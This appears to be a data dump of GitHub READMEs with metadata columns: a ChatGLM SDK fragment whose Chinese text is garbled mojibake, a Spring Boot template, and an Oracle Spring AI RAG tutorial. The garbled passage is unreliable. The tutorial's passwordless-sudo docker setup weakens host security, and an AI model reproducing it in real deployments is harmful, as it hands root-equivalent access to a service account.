    log.info(""4. æ‰§è¡Œå®Œæ­¥éª¤3ä»¥åï¼Œå¯ä»¥å¤åˆ¶ç›´æ¥è¿è¡Œ curl.sh æ–‡ä»¶ï¼Œæˆ–è€…å¤åˆ¶ curl.sh æ–‡ä»¶å†…å®¹åˆ°æ§åˆ¶å°/ç»ˆç«¯/ApiPostä¸­è¿è¡Œ"");
}
```

```java
curl -X POST \
        -H ""Authorization: Bearer <æŠŠè·å¾—çš„Tokenå¡«å†™è¿™ï¼Œå¹¶å»æ‰ä¸¤ä¸ªå°–æ‹¬å·>"" \
        -H ""Content-Type: application/json"" \
        -H ""User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)"" \
        -H ""Accept: text/event-stream"" \
        -d '{
        ""top_p"": 0.7,
        ""sseFormat"": ""data"",
        ""temperature"": 0.9,
        ""incremental"": true,
        ""request_id"": ""xfg-1696992276607"",
        ""prompt"": [
        {
        ""role"": ""user"",
        ""content"": ""å†™ä¸ªjavaå†’æ³¡æ’åº""
        }
        ]
        }' \
  http://open.bigmodel.cn/api/paas/v3/model-api/chatglm_lite/sse-invoke
```

- è¿è¡Œåä½ ä¼šè·å¾—ä¸€ä¸ª Token ä¿¡æ¯ï¼Œä¹‹ååœ¨ curl.sh ä¸­æ›¿æ¢  Authorization: Bearer åé¢çš„å€¼ã€‚å°±å¯ä»¥æ‰§è¡Œæµ‹è¯•äº†ã€‚

## 3. ç¨‹åºæ¥å…¥

SpringBoot é…ç½®ç±»

```java
@Configuration
@EnableConfigurationProperties(ChatGLMSDKConfigProperties.class)
public class ChatGLMSDKConfig {

    @Bean
    @ConditionalOnProperty(value = ""chatglm.sdk.config.enabled"", havingValue = ""true"", matchIfMissing = false)
    public OpenAiSession openAiSession(ChatGLMSDKConfigProperties properties) {
        // 1. é…ç½®æ–‡ä»¶
        cn.bugstack.chatglm.session.Configuration configuration = new cn.bugstack.chatglm.session.Configuration();
        configuration.setApiHost(properties.getApiHost());
        configuration.setApiSecretKey(properties.getApiSecretKey());

        // 2. ä¼šè¯å·¥å‚
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);

        // 3. å¼€å¯ä¼šè¯
        return factory.openSession();
    }

}

@Data
@ConfigurationProperties(prefix = ""chatglm.sdk.config"", ignoreInvalidFields = true)
public class ChatGLMSDKConfigProperties {

    /** çŠ¶æ€ï¼›open = å¼€å¯ã€close å…³é—­ */
    private boolean enable;
    /** è½¬å‘åœ°å€ */
    private String apiHost;
    /** å¯ä»¥ç”³è¯· sk-*** */
    private String apiSecretKey;

}
```

```java
@Autowired(required = false)
private OpenAiSession openAiSession;
```

- æ³¨æ„ï¼šå¦‚æœä½ åœ¨æœåŠ¡ä¸­é…ç½®äº†å…³é—­å¯åŠ¨ ChatGLM SDK é‚£ä¹ˆæ³¨å…¥ openAiSession ä¸º null

yml é…ç½®

```pom
# ChatGLM SDK Config
chatglm:
  sdk:
    config:
      # çŠ¶æ€ï¼›true = å¼€å¯ã€false å…³é—­
      enabled: false
      # å®˜ç½‘åœ°å€ 
      api-host: https://open.bigmodel.cn/
      # å®˜ç½‘ç”³è¯· https://open.bigmodel.cn/usercenter/apikeys
      api-secret-key: 4e087e4135306ef4a676f0cce3cee560.sgP2DUs*****
```
",0,0,1,0.0,"['by', 'chatglm', 'sdk', 'config', 'http']","['by', 'chatglm', 'sdk', 'config', 'http']",1.0,"[org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:versions-maven-plugin]",0.0,1.0,0.0
jazzybruno/Spring-Boot-Template,main,"## SPRING BOOT TEMPLATE

This is a template for a Spring Boot project. It includes the following features:

- Spring Boot ( Recent Version )
- Spring Security ( Recent version ) 
- Spring Data JPA
 - Spring Mail
 - OpenAPI 3.0

## Getting Started
 - Clone the project :
```bash
git clone <url>
```

 - Edit the application.properties file :
```
  cd src/main/resources
    nano application.properties
```
- Edit the following properties :
```
spring.datasource.url=<database_url>
spring.datasource.username=<database_username>
spring.datasource.password=<database_password>

spring.mail.username=<your email username>
spring.mail.password<your email password>
adminKey = <admin_registration_key>

app_name=<The name of your application>
client.host=<your backend host>
front.host=<your frontend host>
```
 - Install packages :
```bash
mvn clean install
```

 - Run the project :
```bash
mvn spring-boot:run
```
-  You can also run it with docker :
```bash
  docker build -t <image_name> .
  docker run -p <desired port>:<desired port> <image_name>
```
- Access the project :
```bash
http://localhost:<desired port>/swagger-ui.html
```

 - Then in the browser you will get a page like this :

 ![img.png](img.png)
## License
Apache License 2.0

",0,0,1,0.0,"['spring', 'boot', 'template', 'get', 'start', 'license']","['spring', 'boot', 'template', 'get', 'start']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
oracle-devrel/springai-rag-db23ai,main,"# Spring AI for RAG on Oracle 23ai Vector DB with OpenAI and private LLMs

![cover](./img/cover.png)

## Introduction

In this demo, we'll guide you through the process of leveraging Java, Spring Boot, Oracle DB23ai and the innovative Spring AI APIs to create next-generation applications.

- Build a Spring Boot Application with RAG (Retrieval Augmented Generation): Discover how to leverage Spring AI to implement a knowledge management system that retrieves relevant information and utilizes large language models to generate insightful responses.
- Integrate Domain Knowledge from Oracle 23ai: Learn how to connect your Spring Boot application with Oracle's 23ai to access and utilize domain-specific knowledge for more accurate and relevant responses.
- Transition to Production with Oracle Backend Platform: We'll address the challenges of moving your knowledge management system from development to production using the Oracle Backend Platform for Spring Boot and Microservices.

Check out [demo here](https://www.youtube.com/watch?v=H2w6oULzFCo&list=PLPIzp-E1msraY9To-BB-vVzPsK08s4tQD&index=26)

The demo shows a Retrieval-Augmented Generation using the following modules:

* Spring AI API
* Oracle DB 23ai
* OpenAI Embeddings
* OpenAI Chat
* OLLAMA local LLM embeddings model
* OLLAMA local LLM LLama2 model for chat

This demo is based on a early draft example of **Spring AI API**'s implementation for the **Oracle 23ai** as vector store, according to the specifications reported here: **[Vector DBs](https://docs.spring.io/spring-ai/reference/api/vectordbs.html)**.

There are two different types of files that contribute to the Retrieval-Augmented Generation (RAG) system in this solution:

- **PDF** file is split in chunks and stored as text with vector embeddings.
- **JSON** docs are created exploiting the **JSON-Duality** capability on existing tables

The interface, that uses Oracle Database 23ai as a Vector Store in a Spring AI pipeline, is the following:

```
public interface VectorStore {

        void add(List<Document> documents);

        Optional<Boolean> delete(List<String> idList);

        List<Document> similaritySearch(SearchRequest request);

        List<Document> similaritySearch(String query);
}
```

These operations allow uploading documents into a vector database, searching for similar documents using the specific vector distance algorithm chosen (you can change this in the `.properties` files). 

```
default List<Document> similaritySearch(String query) {
    return this.similaritySearch(SearchRequest.query(query));
}
```

The file `src/main/java/com/example/demoai/OracleDBVectorStore.java` holds this implementation.

The Vector Store saves the data in this **VECTORTABLE**:

```
CREATE TABLE VECTORTAB (
        id NUMBER GENERATED AS IDENTITY,
        text CLOB,
        embeddings VECTOR,
        metadata JSON,
        PRIMARY KEY (id)
);
```

The **id** will be based on an generated **Identity** Column key, but this can be changed if you prefer.

The metadata content depends on what's coming from Document object, and in this case it will hold the following data:

```
{
    ""page_number"":""xxx"",
    ""file_name"":""xxx"", 
}
```

This table is created at each application startup by default but, by configuring the `config.dropDb` parameter to `false` in  `application-dev.properties`, you can accumulate data every time you start up the application startup, in the same vector tab, and these documents will increase the vector database's knowledge base.

## Docs

With regards to endpoint services, you can find the implementation in [DemoaiController.java](src/main/java/com/example/demoai/controller/DemoaiController.java). The following main REST services have been implemented:

- **/store**

    Accepts a PDF doc to be chunked, vector embeddings are created and stored in the **VECTORTABLE**.

- **/store-json**

    Providing the name of a **relational duality view** created on the DB, this service creates, for each JSON record, a vector embedding, chunks it, and stores it in the **VECTORTABLE**. This service shows that you can put both structured and unstructured text data into the RAG, and you'll be able to query this data in natural language as querying a JSON document.

- **/rag**
    Providing a query in natural language, it manages in a Retrieval-Augmented Generation pipeline that uses the content of **VECTORTABLE**, adding the most similar chunks to the question to the context and sending everything using a template in the file: [prompt-template.txt](src/main/resources/prompt-template.txt)

The following tests have also been implemented, to debug and play with the solution if you're really interested:

- **/search-similar**

    Returns a list of the nearest chunks to the message provided stored in the **VECTORTABLE**. This means, you can check the ""closest matches"" in your vector database. It's useful to get info about the context used to determine the prompt sent to the LLM for the completion process and use as references to provide a response.

- **/delete**

    Allows you to remove a list of chunks, identified by their IDs, from **VECTORTABLE**.

- **/embedding**

    Provide, given an input string, its corresponding generated vector embedding.

- **/generate**

    Chat client that doesn't use the RAG pipeline. It could be used as a baseline to show the differences between a response provided by the LLM service as-is (OpenAI, OLLAMA) and an augmented request. It's useful to check if any public content has been used for LLM training, whether the response is near to what you expect, without providing your documents.

## 0. Prerequisites

### JDBC driver for Oracle DB 23ai



This demo works with the latest `ojdbc11.jar` driver related to the Oracle DBMS (23.4). To run this project, download this driver from Oracle site or directly from your DB server, looking in the directory: `$ORACLE_HOME/jdbc/lib/ojdbc11.jar`. After downloading in your local home dir, import it as a local Maven artifact with this command:

```
mvn install:install-file -Dfile=<HOME_DIR>/ojdbc11.jar -DgroupId=com.oracle.database.jdbc -DartifactId=ojdbc11 -Dversion=23.4.0.0 -Dpackaging=jar -DgeneratePom=true
```
or including in the `pom.xml` the following dependency:

```xml
<dependency>
	<groupId>com.oracle.database.jdbc</groupId>
	<artifactId>ojdbc11</artifactId>
	<version>23.4.0.24.05</version>
</dependency>
```

### Environment variables

Set the correct environment variables in a `env.sh` (or put these directly into `/home/$USER/.bashrc`) file with this content, according your server IPs (if you're planning on deploying with oLLaMA):

```
export OPENAI_URL=https://api.openai.com
export OPENAI_MODEL=gpt-3.5-turbo
export OPENAI_EMBEDDING_MODEL=text-embedding-ada-002
export VECTORDB=[VECTORDB_IP]
export DB_USER=vector
export DB_PASSWORD=vector
export OLLAMA_URL=http://[GPU_SERVER_IP]:11434
export OLLAMA_EMBEDDINGS=NousResearch--llama-2-7b-chat-hf
export OLLAMA_MODEL=llama2:7b-chat-fp16
export OPENAI_API_KEY=[YOUR_OPENAI_KEY]
#export OPENAI_URL=http://[GPU_SERVER_IP]:3000
#export OPENAI_MODEL=NousResearch--llama-2-7b-chat-hf
```

To invoke both OpenAI `gpt-3.5-turbo` and `text-embedding-ada-002`, you'll also need your `YOUR_OPENAI_KEY`, which must be obtained directly from the [Open AI developer platform](https://platform.openai.com/).

About the OLLAMA_EMBEDDINGS/MODEL used, you are free for your experiment to go on the [OLLAMA Library](https://ollama.com/library) and choose other models.

As you can see, you can configure also the `OPENAI_URL`, which helps to invoke OpenAI LLMs providers compatible with the OpenAI APIs. This way, you can switch easly to other providers, even private ones.

Set env with command in a shell:

```
source ./env.sh
```

## 1. Setup

### Oracle Database 23ai setup

1. Download and install from [Oracle Database Free Get Started](https://www.oracle.com/database/free/get-started/) site an **Oracle Database 23ai Free**, for example, as a docker container in this way:

```
docker run -d -p 1521:1521 --name db23ai container-registry.oracle.com/database/free:latest
docker exec db23ai ./setPassword.sh manager
```

2. After startup, download and install an Oracle Instant Client from the same [site](https://www.oracle.com/database/free/get-started/), and connect to the instance as shown here:

```
sqlplus sys/manager@""${VECTORDB}:1521/FREEPDB1"" as sysdba
```

3. If running locally:

```
sqlplus sys/manager@""localhost:1521/FREEPDB1"" as sysdba
```

to create a **vector** user to run the example:

```
create user vector identified by ""vector"";
grant connect to vector;
grant resource to vector;
alter user vector default role connect, resource;
alter user vector quota unlimited on users;
```

Once we've created the user, we'll be able to use it in our Spring AI application by modifying `application-dev.properties`.

If running locally:

```
sqlplus vector/vector@""localhost:1521/FREEPDB1"" as sysdba
```

We can check the content by connecting to the Oracle DB:

```
sqlplus vector/vector@""${VECTORDB}:1521/FREEPDB1""
```

### Application

In the `application-dev.properties` files will be used the environment variables set at the step before:

```
spring.ai.openai.api-key=${OPENAI_API_KEY}
spring.ai.openai.base-url=${OPENAI_URL}
spring.ai.openai.chat.options.model=${OPENAI_MODEL}
spring.ai.openai.embedding.options.model=${OPENAI_EMBEDDING_MODEL}
spring.ai.openai.chat.options.temperature=0.3
spring.datasource.url=jdbc:oracle:thin:@${VECTORDB}:1521/ORCLPDB1
spring.datasource.username=${DB_USER}
spring.datasource.password=${DB_PASSWORD}
spring.datasource.driver-class-name=oracle.jdbc.OracleDriver
config.tempDir=tempDir
config.dropDb=true
config.vectorDB=vectortable
config.distance=EUCLIDEAN
spring.servlet.multipart.max-file-size=10MB
spring.servlet.multipart.max-request-size=20MB
spring.ai.ollama.base-url=${OLLAMA_URL}
spring.ai.ollama.embedding.options.model=${OLLAMA_EMBEDDINGS}
spring.ai.ollama.chat.options.model=${OLLAMA_MODEL}
```

In `application.properties`, check if the default env is set as `dev`:

```
spring.profiles.active=dev
```

Then build and run the application:

- Set env: `source ./env.sh`
- Build: `mvn clean package -Dmaven.test.skip=true`
- Run: `mvn spring-boot:run`

For each source update, repeat these two steps.

## 1. Test OpenAI version

Check code:

pom.xml:

```
<!--//CHANGE-->
<!-- Ollama for embeddings/chat
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
    </dependency>
-->
```

DemoaiController.java:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaEmbeddingClient;
    //import org.springframework.ai.ollama.OllamaChatClient;
    ...

    //CHANGE
    private final EmbeddingClient embeddingClient;
    //private final OllamaEmbeddingClient embeddingClient;

    //CHANGE
        private final ChatClient chatClient;
        //private final OllamaChatClient chatClient;

    ...

    //CHANGE
        @Autowired
        public DemoaiController(EmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // OpenAI full
        //public DemoaiController(OllamaEmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // Ollama Embeddings - OpenAI Completion 
        //public DemoaiController(OllamaEmbeddingClient embeddingClient, OllamaChatClient chatClient, VectorService vectorService) { // Ollama full 

```

VectorService.java:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaChatClient;
    ...
    //CHANGE
        private final ChatClient aiClient;
        //private final OllamaChatClient aiClient;

        //CHANGE
        VectorService(@Qualifier(""openAiChatClient"") ChatClient aiClient) {
        //VectorService(OllamaChatClient aiClient) {
```

DemoaiApplication.java:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaEmbeddingClient;

    ...
    //CHANGE
        @Bean
        VectorStore vectorStore(EmbeddingClient ec, JdbcTemplate t) {
        //VectorStore vectorStore(OllamaEmbeddingClient ec, JdbcTemplate t) {
            return new OracleDBVectorStore(t, ec); 
        }

```

### Pre document store

#### Generic chat

```bash
curl -X POST http://localhost:8080/ai/generate \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""What is a Generative AI?""}' | jq -r .generation
```

Here's a sample output from the command:

```
    Generative AI refers to artificial intelligence systems that are capable of creating new content, such as images, text, or music, based on patterns and examples provided to them. These systems use algorithms and machine learning techniques to generate realistic and original content that mimics human creativity. Generative AI can be used in a variety of applications, such as creating art, writing stories, or designing products.
```

#### RAG request without any data stored in the DB

```
curl -X POST http://localhost:8080/ai/rag \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""Can I use any kind of development environment to run the example?""}'
```

Output from the command:

```
    {
        ""generation"" : ""Based on the provided documents, it is not specified whether any kind of development environment can be used to run the example. Therefore, I'm sorry but I haven't enough information to answer.""
    }
```

### Search on data coming from a PDF stored

Store a PDF document in the DBMC 23c library: [**OracleÂ® Database: Get Started with Java Development**](https://docs.oracle.com/en/database/oracle/oracle-database/23/tdpjd/get-started-java-development.pdf) in the Oracle DB 23ai with embeddings coming from the OpenAI Embedding service. Dowload locally, and run in a shell:

```
curl -X POST -F ""file=@./docs/get-started-java-development.pdf"" http://localhost:8080/ai/store
```

**Note**: this process usually takes time because document will be splitted in hundreds or thousands of chunks, and for each one it will asked for an embeddings vector to OpenAI API service. In this case has been choosen a small document to wait a few seconds.

#### Q&A Sample

Let's look at some info in this document and try to query comparing the results with the actual content:

- **4.1.1 Oracle Database**

![dbtype](./img/dbtype.png)

```
curl -X POST http://localhost:8080/ai/rag \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""Which kind of database you can use to run the Java Web example application) ""}' | jq -r .generation
```

Response:

```
    You can use either Oracle Autonomous Database or Oracle Database Free available on OTN to run the Java Web example application.
```

- **4.1.5 Integrated Development Environment**

![ide](./img/ide.png)

```
curl -X POST http://localhost:8080/ai/rag \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""Can I use any kind of development environment to run the example?""}' | jq -r .generation
```

Response:

```
    Based on the information provided in the documents, you can use an Integrated Development Environment (IDE) like IntelliJ Idea community version to develop the Java application that connects to the Oracle Database. The guide specifically mentions using IntelliJ Idea for creating and updating the files for the application. Therefore, it is recommended to use IntelliJ Idea as the development environment for running the example.
```

- **4.2 Verifying the Oracle Database Installation**

![dbverify](./img/dbverify.png)

```
curl -X POST http://localhost:8080/ai/rag \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""To run the example, how can I check if the dbms it is working correctly?""}' | jq -r .generation
```

Response:

```
    To check if the Oracle Database is working correctly, you can verify the installation by connecting to the database using the following commands:
    1. Navigate to the Oracle Database bin directory: $ cd $ORACLE_HOME/bin
    2. Connect to the database as sysdba: $ ./sqlplus / as sysdba

    If the connection is successful, you will see an output confirming that you are connected to the root container of the database. This indicates that the Oracle Database installation is working correctly. Additionally, you can download the Client Credentials for an ATP instance and verify the connection by following the steps provided in the documentation.
```

First, let's ask for a question not related to the document stored:

```
curl -X POST http://localhost:8080/ai/rag \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""How is the weather tomorrow?""}' | jq -r .generation
```

Response:

```
{
    ""generation"" : ""I'm sorry but I haven't enough info to answer.""
}
```

Then, let's test similarity search for message **""To run the example, how can I check if the dbms it is working correctly?""** example. The `top_k` parameter determines how many nearest chunks to retrieve is set to **4** by default, and the result set is by default in reverse order. So, we need to execute the fololwing command:

```
curl -X POST http://localhost:8080/ai/search-similar \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""To run the example, how can I check if the dbms it is working correctly?""}' | jq '.[3]'
```

Then, we test the deletion. Indexes begin counting at `1`, so let's execute the following command to delete occurrences 1, 4 and 5:

```
curl ""http://localhost:8080/ai/delete?id=1&id=5&id=4""
```

## 2. Running generations and chat with private LLMs through OLLAMA

We'll need to create an OCI Compute instance and install OLLAMA inside. Then, we will expose the server through an Internet Gateway and allow our Spring AI application connect to the OLLAMA server and make the equivalent requests as with OpenAI generations.

The following shape and images are recommended for the server: (it will require a GPU, as we'll be running an HPC load that will require lots of computing! More than the CPU can handle at this moment without quantization enabled.)

- Shape: `VM.GPU.A10.2` (2x NVIDIA A10 Tensor Cores)
- OCPU: 30
- GPU Memory: 48GB
- CPU Memory: 480GB
- Storage: >250GB
- Max Network Bandwidth: 48Gbps (6GBps)
- Image: Oracle Linux 8.9

1. From OCI console, choose Compute/Instances menu:

    ![image](./img/instance.png)

2. Press **Create instance** button:

    ![image](./img/create.png)

3. Choose `VM.GPU.A10.2` shape, selecting **Virtual machine**/**Specialty and previous generation**:

    ![image](./img/shape.png)

4. Choose the Image `Oracle-Linux-8.9-Gen2-GPU-2024.02.26-0` from Oracle Linux 8 list of images:

    ![image](./img/image.png)

5. Specify a custom boot volume size and set 100 GB:

    ![image](./img/bootvolume.png)

6. Create the image.

7. At the end of creation process, obtain the **Public IPv4 address**, and with your private key (the one you generated or uploaded during creation), connect to:

```
    ssh -i ./<your_private>.key opc@[GPU_SERVER_IP]
```

8. Install and configure docker to use GPUs:

```
    sudo /usr/libexec/oci-growfs
    curl -s -L https://nvidia.github.io/libnvidia-container/stable/rpm/nvidia-container-toolkit.repo |   sudo tee /etc/yum.repos.d/nvidia-container-toolkit.repo
    sudo dnf install -y dnf-utils zip unzip
    sudo dnf config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo
    sudo dnf remove -y runc
    sudo dnf install -y docker-ce --nobest
    sudo useradd docker_user
```

9. We need to make sure that your Operating System user has permissions to run Docker containers. To do this, we can run the following command:

```
sudo visudo
```

And add this line at the end:

```
docker_user  ALL=(ALL)  NOPASSWD: /usr/bin/docker
```

10. For convenience, we need to switch to our new user. For this, run:

```
sudo su - docker_user
```

11. Finally, let's add an alias to execute Docker with admin privileges every time we type `docker` in our shell. For this, we need to modify a file, depending on your OS (in `.bash_profile` (MacOS) / `.bashrc` (Linux)). Insert, at the end of the file, this command:

```
alias docker=""sudo /usr/bin/docker""
exit
```

12. We finalize our installation by executing:

```
sudo yum install -y nvidia-container-toolkit
sudo nvidia-ctk runtime configure --runtime=docker
sudo systemctl restart docker
nvidia-ctk runtime configure --runtime=docker --config=$HOME/.config/docker/daemon.json
```

13. If you're on Ubuntu instead, run:

```
sudo apt-get install nvidia-container-toolkit=1.14.3-1 \
        nvidia-container-toolkit-base=1.14.3-1 \
        libnvidia-container-tools=1.14.3-1 \
        libnvidia-container1=1.14.3-1
sudo apt-get install -y nvidia-docker2
```

13. Let's reboot and re-connect to the VM, and run again:

```
sudo reboot now
# after restart, run:
sudo su - docker_user
```

14. Run `docker` to check if everything it's ok.

15. Let's run a Docker container with the `ollama/llama2` model for embeddings/completion:

```
docker run -d --gpus=all -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama serve
docker exec -it ollama ollama pull nomic-embed-text
docker exec -it ollama ollama pull llama2:13b-chat-fp16
docker logs -f --tail 10 ollama
```

Both the model, for embeddings/completion will run under the same server, and they will be addressed providing in the REST request for the specific model required.

To handle the firewall, we need to open port `11434` on our Security List. For this, let's:

1. In **Instance details** click on the **Virtual cloud network:** link:

    ![securitylist](./img/vcn.png)

2. In the menu **Resources** click on **Security Lists**:

    ![security](./img/securitylist.png)

3. Click on the link of **Default Security List...**

4. Click on the **Add Ingress Rules** button:

    ![security](./img/addIngress.png)

5. Click on the **Add Ingress Rules** button:

    ![security](./img/addIngress.png)

6. Insert details as shown in the following image and then click **Add Ingress Rules** button:

    ![security](./img/rule.png)

7. Update the `env.sh` file and run `source ./env.sh`:

```
#export OPENAI_URL=http://[GPU_SERVER_IP]:3000
export OPENAI_URL=https://api.openai.com
#export OPENAI_MODEL=NousResearch--llama-2-7b-chat-hf
export OPENAI_MODEL=gpt-3.5-turbo
export OPENAI_EMBEDDING_MODEL=text-embedding-ada-002
export VECTORDB=[VECTORDB_IP]
export DB_USER=vector
export DB_PASSWORD=vector
export OLLAMA_URL=http://[GPU_SERVER_IP]:11434
export OLLAMA_EMBEDDINGS=NousResearch--llama-2-7b-chat-hf
export OLLAMA_MODEL=llama2:7b-chat-fp16
export OPENAI_API_KEY=[YOUR_OPENAI_KEY]
```

8. Test with a shell running:

```
curl ${OLLAMA_URL}/api/generate -d '{
        ""model"": ""llama2:7b-chat-fp16"",
        ""prompt"":""Why is the sky blue?""
}'
```

You'll receive the response in continuous sequential responses, facilitating the delivery of the content little by little, instead of forcing users to wait for the whole response to be generated before it's desplayed to them.

### Customize for private LLMs: Vector Embeddings local, Open AI for Completion

* pom.xml: uncomment the ollama dependency:

```
    <!--//CHANGE-->	
	<!-- Ollama for embeddings -->
		<dependency>
			<groupId>org.springframework.ai</groupId>
			<artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
		 </dependency>
	 	<!--  -->
```

* DemoaiController.java - uncomment with final source code:

```
    //CHANGE
    import org.springframework.ai.ollama.OllamaEmbeddingClient;
    //import org.springframework.ai.ollama.OllamaChatClient;
...

    //CHANGE
    //private final EmbeddingClient embeddingClient;
    private final OllamaEmbeddingClient embeddingClient;

    //CHANGE
    private final ChatClient chatClient;
    //private final OllamaChatClient chatClient;
...

    //CHANGE
    //public DemoaiController(EmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // OpenAI full
    public DemoaiController(OllamaEmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // Ollama Embeddings - OpenAI Completion 
    //public DemoaiController(OllamaEmbeddingClient embeddingClient, OllamaChatClient chatClient, VectorService vectorService) { // Ollama full 
        

```

VectorService.java - check if it's like this:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaChatClient;

    ...

    //CHANGE
        private final ChatClient aiClient;
        //private final OllamaChatClient aiClient;

        //CHANGE
        VectorService(@Qualifier(""openAiChatClient"") ChatClient aiClient) {
        //VectorService(OllamaChatClient aiClient) {

```

Test as done before. In the gpu docker logs, you'll see the chunks coming to be embedded.

### Full private LLMs with `llama2:7b-chat-fp16`

DemoaiController.java - uncomment with final source code:

```
    //CHANGE
    import org.springframework.ai.ollama.OllamaEmbeddingClient;
    import org.springframework.ai.ollama.OllamaChatClient;

    ...
        //CHANGE
        //private final EmbeddingClient embeddingClient;
        private final OllamaEmbeddingClient embeddingClient;

        //CHANGE
        //private final ChatClient chatClient;
        private final OllamaChatClient chatClient;
    ...


    //CHANGE
        @Autowired
        //public DemoaiController(EmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // OpenAI full
        //public DemoaiController(OllamaEmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // Ollama Embeddings - OpenAI Completion 
        public DemoaiController(OllamaEmbeddingClient embeddingClient, OllamaChatClient chatClient, VectorService vectorService) { // Ollama full 
        

```

VectorService.java - uncomment with final source code:

```
    //CHANGE
    import org.springframework.ai.ollama.OllamaChatClient;

    ...


        //CHANGE
        //private final ChatClient aiClient;
        private final OllamaChatClient aiClient;

        //CHANGE
        //VectorService(@Qualifier(""openAiChatClient"") ChatClient aiClient) {
        VectorService(OllamaChatClient aiClient) {
```

Test as before. Now, you could see a tiny degradation of quality (since the model is quite small), mantaining the same embeddings and context retrieval. For example, with the question:

```
    Q: Which kind of database you can use to run the Java Web example application:
    A: The document states that the application uses Oracle JDBC Thin driver, Universal Connection Pool (UCP), and Java in the Database (using embedded OJVM). Therefore, you can use an Oracle database to run the Java Web example application.
```

This first result doesn't return a very good, personalized result. However, if we  good. But for:

```
    Q: Can I use any kind of development environment to run the example?
    A: the user can use any development environment to run the example as long as it has a Java compiler and a database manager installed. The DOCUMENTS text does not specify any particular IDE that must be used, so any IDE with Java development capabilities should work. However, the guide does recommend using IntelliJ Idea Community Edition for ease of development, but this is not a requirement.\n\nTo answer the user's question, you could say: \""Yes, you can use any development environment to run the example as long as it has a Java compiler and a database manager installed. While the guide recommends using IntelliJ Idea Community Edition for ease of development, any IDE with Java development capabilities should work.\
```

The result is more customized and acceptable.

This trade-off in using private LLMs model could be overcome choosing *larger models*, enough to mantain a good quality.

> **Note**: the number of billions of parameters of a model version usually has a direct correlation with the size of the model, and its generation quality. The higher, the better, although you also need to watch out for OOM (out of memory) errors and a slower generation throughput.

## 3. Deploy on Oracle Backend for Spring Boot and Microservices

Let's show what Oracle can offer to deploy on an enterprise grade the GenAI application developed so far.

The platform [**Oracle Backend for Spring Boot and Microservices**](https://oracle.github.io/microservices-datadriven/spring/) allows developers to build microservices in Spring Boot and provision a backend as a service with the Oracle Database and other infrastructure components that operate on multiple clouds. This service vastly simplifies the task of building, testing, and operating microservices platforms for reliable, secure, and scalable enterprise applications.

To setup this platform, follow the instruction included in **Lab1: Provision an instance** and **Lab 2: Setup your Development Environment** of the [LiveLabs: CloudBank - Building an App with Spring Boot and Mobile APIs with Oracle Database and Kubernetes](https://apexapps.oracle.com/pls/apex/f?p=133:180:7384418726808::::wid:3607). At the end, proceed with the following steps:

1. In the `application.properties` change the active env as `prod`:

```
spring.profiles.active=prod
```

2. In the `application-prod.properties`, change the parameters in `< >` with the values set in `env.sh`:

```
    spring.ai.openai.api-key=<OPENAI_API_KEY>
    spring.ai.openai.base-url=<OPENAI_URL>
    spring.ai.openai.chat.options.model=gpt-3.5-turbo
    spring.ai.openai.embedding.options.model=text-embedding-ada-002
    spring.datasource.url=jdbc:oracle:thin:@<VECTORDB>:1521/ORCLPDB1
    spring.datasource.username=vector
    spring.datasource.password=vector
    spring.datasource.driver-class-name=oracle.jdbc.OracleDriver
    config.tempDir=tempDir
    config.dropDb=true
    config.vectorDB=vectortable
    config.distance=EUCLIDEAN
    spring.servlet.multipart.max-file-size=10MB
    spring.servlet.multipart.max-request-size=20MB
    spring.ai.ollama.base-url=<OLLAMA_URL>
    spring.ai.ollama.embedding.options.model=nomic-embed-text
    spring.ai.ollama.chat.options.model=llama2:7b-chat-fp16
```

3. Open a terminal, and using the **Kubernetes** admin command, open a port forward to the backend:

```
kubectl -n obaas-admin port-forward svc/obaas-admin 8080:8080
```

4. Using the command-line tool `oractl`, deploy the application running the following commands:

```
oractl:>connect
? username obaas-admin
? password **************

oractl:>create --app-name rag
oractl:>deploy --app-name rag --service-name demoai --artifact-path /Users/cdebari/Documents/GitHub/spring-ai-demo/target/demoai-0.0.1-SNAPSHOT.jar --image-version 0.0.1 --service-profile prod

```

5. Let's test the application with port forwarding. First, we need to stop the current `demoai` instance running on the background, to free the previous port being used; and, in a different terminal, run a port forwarding on port 8080 to the remote service on the **Oracle Backend for Spring Boot and Microservices**:

```
kubectl -n rag port-forward svc/demoai 8080:8080
```

6. In a different terminal, test the service as done before, for example:

```
curl -X POST http://localhost:8080/ai/rag \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""Can I use any kind of development environment to run the example?""}' | jq -r .generation
```

## Notes/Issues

Additional Use Cases like summarization and embedding coming soon.

## URLs

- [Oracle AI](https://www.oracle.com/artificial-intelligence/)
- [AI for Developers](https://developer.oracle.com/technologies/ai.html)

## Contributing

This project is open source.  Please submit your contributions by forking this repository and submitting a pull request!  Oracle appreciates any contributions that are made by the open-source community.

## License

Copyright (c) 2024 Oracle and/or its affiliates.

Licensed under the Universal Permissive License (UPL), Version 1.0.

